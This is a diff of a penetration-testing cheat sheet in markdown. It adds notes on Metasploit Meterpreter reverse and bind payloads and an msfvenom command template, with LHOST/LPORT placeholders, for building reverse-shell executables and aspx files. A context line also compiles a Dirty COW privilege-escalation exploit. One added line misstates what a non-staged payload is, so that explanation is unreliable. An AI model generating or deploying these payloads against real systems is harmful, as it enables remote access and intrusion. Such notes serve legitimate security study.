@@ -462,21 +462,32 @@ gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
 ## MSF Payloads
+- 64-bit (`x64`) payload cannot run on 32-bit architecture.
+- Staged payload (sent in 2 parts), non-staged payload (exploit and payload sent separately).
+  - `windows/x64/meterpreter/reverse_tcp` is staged.
+  - `windows/x64/meterpreter_reverse_tcp` is non-staged.
+
 ```
 windows/meterpreter/reverse_tcp
-windows/meterpreter/bind_tcp
 windows/x64/meterpreter/reverse_tcp
+
+windows/meterpreter/bind_tcp
 
 linux/x86/meterpreter/reverse_tcp
 ```
+
 ### msfvenom
 - https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom
-- Staged payload (sent in 2 parts), non-staged payload (exploit and payload sent separately).
 
 ```
 msfvenom
-```
+msfvenom --list payload
 
+msfvenom -a <architecture> -p <payload> LHOST=<ip> LPORT=<port> -f <format> > <filename>
+```
+- `<architecture>`: `x86`, `x64`
+- `<payload>`: Pick your poison
+- `<format>`: `exe`, `aspx`
 
 ## ProFTPD 1.3.3c
 ```
